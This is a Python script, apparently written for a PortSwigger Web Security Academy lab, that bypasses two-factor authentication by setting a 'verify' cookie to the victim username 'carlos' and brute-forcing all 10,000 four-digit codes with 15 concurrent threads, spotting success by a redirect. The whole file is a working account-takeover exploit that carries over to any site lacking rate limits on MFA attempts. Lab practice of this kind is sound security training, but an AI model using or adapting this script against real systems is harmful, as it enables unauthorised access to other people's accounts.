# /// script
# dependencies = ["requests"]
# ///
"""
2FA Broken Logic - brute force the 4-digit mfa-code.

Vulnerability: the app never rate-limits or invalidates the session after
repeated wrong 2FA codes, so all 10,000 combinations (0000-9999) can be
tried against the same session.

Threaded version: fires guesses concurrently since each request is
I/O-bound (waiting on the network), not CPU-bound.
"""

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from rich.console import Console

console = Console()

TARGET = "https://0ab2008a04591bfe80685810006700a6.web-security-academy.net"
USERNAME_TO_VERIFY = "carlos"  # value of the `verify` cookie from login2
WORKERS = 15

session = requests.Session()
session.cookies.set("verify", USERNAME_TO_VERIFY)

found_event = threading.Event()
found_code = None


def try_code(code: int):
    if found_event.is_set():
        return None

    guess = f"{code:04d}"
    resp = session.post(
        f"{TARGET}/login2",
        data={"mfa-code": guess},
        allow_redirects=False,
    )

    # Wrong code -> 200 with "Incorrect security code" on the page.
    # Right code -> redirect (302/303) to /my-account.
    if resp.status_code in (302, 303) and "Incorrect security code" not in resp.text:
        console.print(f"[+] Found code: {guess}")
        return guess
    return None


def main():
    global found_code
    # TRy get requests to see if sever is live
    try:
        resp = session.get(f"{TARGET}/login2", allow_redirects=False)
        if resp.status_code != 200:
            console.print(f"[-] Server returned status code {resp.status_code}. Exiting.")
            return
    except requests.RequestException as e:
        console.print(f"[-] Error connecting to server: {e}. Exiting.")
        return

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(try_code, code): code for code in range(10000)}

        for future in as_completed(futures):
            result = future.result()
            if result:
                found_code = result
                found_event.set()
                console.print(f"[+] Found code: {found_code}")
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found_code:
        console.print("[-] No valid code found in 0000-9999")


if __name__ == "__main__":
    main()